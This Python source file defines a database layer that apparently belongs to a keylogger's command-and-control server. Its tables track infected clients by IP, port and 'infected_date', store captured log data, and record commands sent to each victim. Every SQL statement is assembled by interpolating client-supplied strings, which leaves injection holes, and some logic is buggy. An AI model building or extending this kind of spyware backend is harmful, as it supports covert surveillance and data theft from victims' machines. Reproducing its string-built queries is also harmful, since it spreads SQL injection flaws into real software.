import pyodbc  # Needs to be installed.
import json
import os

class Database:  # Object to work with database.

    client_info = "client_info"  # Table with client info.
    log_data = "log_data"  # Table with logged data.
    client_connections = "client_connections"
    client_commands = "client_commands"
    database_info = None  # Database driver, server, name
    connection = None  # Connection handle.
    cursor = None  # Communication handle
    json = False  # Using Text as storage?

    def __init__(self):
        pass
        # self.database_info ="""
        #     Driver={ODBC Driver 17 for SQL Server};
        #     Server=DESKTOP-UCFQ6S6\SQLEXPRESS;
        #     Database=key_logger;
        #     Trusted_Connection=yes;
        #     """  # Contains multiline string with database info.

    def connect_custom(self, database_info):  # Connects to a custom Database
        database_info = database_info
        try:
            self.connection = pyodbc.connect(database_info)
            self.cursor = self.connection.cursor()
            self.init_database()
            self.json = False
            return 0
        except pyodbc.InterfaceError:
            return 1

    def init_database(self):  # Creates tables in DB
        # Should check each table and maybe each column to ensure they are created and if not create them.
        if not self.cursor.tables(table=f'{self.client_info}', tableType='TABLE').fetchone():  # Creates client_info if it does not exist
            self.cursor.execute(F"""
                CREATE TABLE {self.client_info} (
                client_id int IDENTITY(1,1) PRIMARY KEY,
                client_ip char(15),
                client_port CHAR(5),
                infected_date datetime
                ); """)
            print(f'TABLE [{self.client_info}] INITIALIZED')
        else:
            print(f'TABLE [{self.client_info}] ALREADY IN DB')

        if not self.cursor.tables(table=f'{self.client_connections}', tableType='TABLE').fetchone():  # Creates client_connections if it does not exist
            self.cursor.execute(f"""
                CREATE TABLE {self.client_connections} (
                client_id int FOREIGN KEY REFERENCES client_info(client_id),
                connection_type bit,
                date_info datetime PRIMARY KEY
                ); """)
            print(f'TABLE [{self.client_connections}] INITIALIZED')

        else:
            print(f'TABLE [{self.client_connections}] ALREADY IN DB')

        if not self.cursor.tables(table=f'{self.client_commands}', tableType='TABLE').fetchone():  # Creates client_connections if it does not exist
            self.cursor.execute(f"""
                CREATE TABLE {self.client_commands} (
                client_id int FOREIGN KEY REFERENCES client_info(client_id),
                command char(3),
                command_date datetime PRIMARY KEY
                ); """)
            print(f'TABLE [{self.client_commands}] INITIALIZED')

        else:
            print(f'TABLE [{self.client_commands}] ALREADY IN DB')

        if not self.cursor.tables(table='commands', tableType='TABLE').fetchone():  # Creates client_connections if it does not exist
            self.cursor.execute(f"""
                CREATE TABLE commands (
                command_id CHAR(3) PRIMARY KEY,
                command_description VARCHAR(100)
                ); """)
            print(f'TABLE [commands] INITIALIZED')
        else:
            print(f'TABLE [commands] ALREADY IN DB')

        if not self.cursor.tables(table=f'{self.log_data}', tableType='TABLE').fetchone():  # Creates client_connections if it does not exist
            self.cursor.execute(f"""
                CREATE TABLE {self.log_data} (
                client_id int FOREIGN KEY REFERENCES client_info(client_id),
                log_data varchar(1024),
                date_info datetime PRIMARY KEY
                ); """)
            print(f'TABLE {self.log_data} INITIALIZED')

        else:
            print(f'TABLE [{self.log_data}] ALREADY IN DB')

    def connect_text(self):
        try:
            open('client_info.txt', 'r')
        except FileNotFoundError:
            open('client_info.txt', 'w')
        try:
            open('client_connections.txt', 'r')
        except FileNotFoundError:
            open('client_connections.txt', 'w')
        try:
            open('log_data.txt', 'r')
        except FileNotFoundError:
            open('log_data.txt', 'w')
        try:
            open('commands.txt', 'r')
        except FileNotFoundError:
            open('commands.txt', 'w')
        try:
            open('client_commands.txt', 'r')
        except FileNotFoundError:
            open('client_commands.txt', 'w')

    def add_client(self, client_address):  # Adds new client or existing client.

        client = self.cursor.execute(f"""
                            SELECT *
                            FROM {self.client_info}
                            WHERE client_ip = '{client_address[0]}'""").fetchone()  # Querys DB to find User
        if not client:  # No client exists.
            self.cursor.execute(f"""
                                INSERT INTO {self.client_info}(client_ip, client_port, infected_date)
                                VALUES('{client_address[0]}', '{client_address[1]}', GETDATE())""").commit()  # Inserts new client
            client = self.cursor.execute(f"""
                                 SELECT *
                                 FROM {self.client_info}
                                 WHERE client_ip = '{client_address[0]}' AND client_port = {client_address[1]}""").fetchone()  # Reads client.
        return client.client_id

    def log_connection(self, client_id, connection_type):  # Logs a user connection/disconnection.
        if json:
            pass
        self.cursor.execute(f"""
                            INSERT INTO {self.client_connections} (client_id, connection_type, date_info)
                            VALUES({client_id}, {connection_type}, GETDATE())""").commit()

    def write_log(self, client_id, data):  # Writes log to storage.
        self.cursor.execute(f"""
                            INSERT INTO {self.log_data}(client_id, log_data, date_info)
                            VALUES({client_id}, '{data}', GETDATE())""").commit()  # Inserts log info.

    def log_command(self, client_id, command): # Logs the commands that are sent to each client.
        self.cursor.execute(f"""
                            INSERT INTO {self.client_commands}(client_id, command, command_date)
                            VALUES({client_id}, '{command}', GETDATE())""").commit()  # Inserts log info.

    def get_id_from_ip(self, client_ip):
        results = self.cursor.execute(f"""SELECT client_id 
                                          FROM {self.client_info} 
                                          WHERE client_ip = '{client_ip}'""").fetchone()
        return results.client_id

    def read(self):
        print("Read")
        cursor = self.connection.cursor()
        cursor.execute("SELECT * FROM client_info")
        for row in cursor:
            print(f"Row = {row}")
